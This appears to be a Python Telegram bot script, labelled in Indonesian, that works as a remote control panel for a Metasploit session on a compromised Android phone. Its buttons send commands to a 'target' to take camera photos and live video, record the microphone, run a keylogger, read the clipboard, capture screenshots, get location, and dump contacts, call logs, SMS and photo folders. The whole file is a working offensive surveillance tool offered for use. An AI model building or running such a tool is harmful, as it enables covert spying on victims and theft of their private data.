import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
import os

TOKEN = "ISI_TOKEN_TELEGRAM_MU"
bot = telebot.TeleBot(TOKEN)

def kirim_menu(chat_id):
    markup = InlineKeyboardMarkup()
    markup.row_width = 2
    markup.add(
        InlineKeyboardButton("📷 Kamera", callback_data="webcam_snap"),
        InlineKeyboardButton("📁 File", callback_data="download /sdcard/Download/"),
        InlineKeyboardButton("📍 Lokasi", callback_data="geolocate"),
        InlineKeyboardButton("📞 Kontak", callback_data="dump_contacts"),
        InlineKeyboardButton("🖼️ Screenshot", callback_data="screenshot"),
        InlineKeyboardButton("🎙️ Rekam Mic", callback_data="record_mic"),
        InlineKeyboardButton("🎥 Kamera Live", callback_data="webcam_stream"),
        InlineKeyboardButton("🗂️ Unduh DCIM", callback_data="download /sdcard/DCIM/"),
        InlineKeyboardButton("📞 Call Logs", callback_data="dump_calllog"),
        InlineKeyboardButton("✉️ SMS Logs", callback_data="dump_sms"),
        InlineKeyboardButton("⌨️ Keylogger On", callback_data="keyscan_start"),
        InlineKeyboardButton("🛑 Keylogger Off", callback_data="keyscan_stop"),
        InlineKeyboardButton("📋 Clipboard", callback_data="clipboard")
    )
    bot.send_message(chat_id, "📲 Pilih fitur Metasploit:", reply_markup=markup)

@bot.message_handler(commands=['start', 'menu'])
def start(message):
    kirim_menu(message.chat.id)

@bot.callback_query_handler(func=lambda call: True)
def callback_query(call):
    perintah = call.data
    with open("control.txt", "w") as f:
        f.write(perintah)
    bot.answer_callback_query(call.id, f"✅ Perintah {perintah} dikirim.")
    bot.send_message(call.message.chat.id, f"Perintah `{perintah}` dikirim ke target.")

bot.polling()
